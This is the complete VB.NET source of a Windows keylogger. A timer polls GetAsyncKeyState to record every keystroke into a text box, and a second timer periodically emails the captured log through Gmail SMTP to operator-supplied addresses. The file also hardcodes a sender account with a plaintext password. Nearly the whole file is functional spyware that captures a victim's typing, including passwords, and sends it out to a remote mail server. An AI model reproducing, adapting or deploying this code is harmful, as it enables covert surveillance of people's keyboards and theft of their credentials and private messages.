Imports System.Net.Mail
Imports System.Text.RegularExpressions
Public Class Form1
    Dim MyMailMesagge As New MailMessage
    Dim smtp As New SmtpClient
    Dim resultado As Integer
    Dim key As String
    Dim pr As String
    Dim re As String
    Dim u As String
    Dim sMail As String
    Dim time_ini, time_fin As Date
    <Runtime.InteropServices.DllImport("user32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, ExactSpelling:=True)> Public Shared Function GetAsyncKeyState(ByVal vkey As Integer) As Short
    End Function

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        RichTextBox1.ReadOnly = True
        MyMailMesagge.From = New MailAddress("anonymous95587@gmail.com", "keylogger")
        MyMailMesagge.Subject = ("KEYLOGGER 0.0 ESPIONAJE")
        MyMailMesagge.Priority = MailPriority.Normal

        'CONFIGURACION SMTP'
        smtp.Host = "smtp.gmail.com"
        smtp.Port = "587"
        smtp.Credentials = New Net.NetworkCredential("anonymous95587@gmail.com", "franco1234")
        smtp.EnableSsl = True

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick

        For i = 2 To 255
            resultado = 0
            resultado = GetAsyncKeyState(i)
            If resultado = -32767 Then
                '160 - 165 shift extended
                If Not (i >= 0 And i <= 31) And i <> 128 And Not (i >= 160 And i <= 165) Then
                    RichTextBox1.Text &= Chr(i)
                ElseIf i = 13 Then
                    RichTextBox1.Text &= "{ENTER}" & vbCrLf
                ElseIf i = 8 Then
                    RichTextBox1.Text &= "{BORRAR}"
                ElseIf i = 9 Then
                    RichTextBox1.Text &= "{TAB}" & vbTab
                ElseIf i = 20 Then
                    RichTextBox1.Text &= "{MAYUS}"
                ElseIf i = 16 Then
                    RichTextBox1.Text &= "{SHIFT}"
                End If
                Exit For
            End If
        Next i

    End Sub


    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Dim i As Integer
        If DateDiff(DateInterval.Minute, time_ini, time_fin) >= CInt(ComboBox2.Text) Then
            time_ini = Date.Now
            MyMailMesagge.To.Clear()
            MyMailMesagge.Body = RichTextBox1.Text & Chr(13) & DateTime.Now
            For i = 0 To ListBox1.Items.Count - 1
                MyMailMesagge.To.Add(ListBox1.Items(i).ToString())
            Next
            smtp.Send(MyMailMesagge)
        Else
            time_fin = Date.Now
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        sMail = TextBox1.Text
        If CorreoValido(LCase(sMail)) = False Then

            MessageBox.Show("Dirección de correo electronico no valida,    el correo debe tener el formato: nombre@dominio.com, " &  " por favor seleccione un correo valido", "Validación de   correo electronico", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            TextBox1.Focus()
            TextBox1 .SelectAll()
        Else
            ListBox1.Items.Add(TextBox1.Text)
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        If ListBox1.Items.Count = 0 Then
            MsgBox("Añada un correo")
        ElseIf ComboBox2.Text = "" Then
            MsgBox("Añada Frecuencia De Envio")
        Else
            Timer3.Enabled = True
            time_ini = Date.Now
        End If
            

    End Sub


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        ListBox1.Items.Remove(ListBox1.SelectedItem)
    End Sub

    Public Function CorreoValido(ByVal sEmai As String)

       ' retorna true o false   
        Return Regex.IsMatch(sMail, "^([\w-]+\.)*?[\w-]+@[\w-]+\.([\w-]+\.)*?[\w]+$")
    End Function
End Class
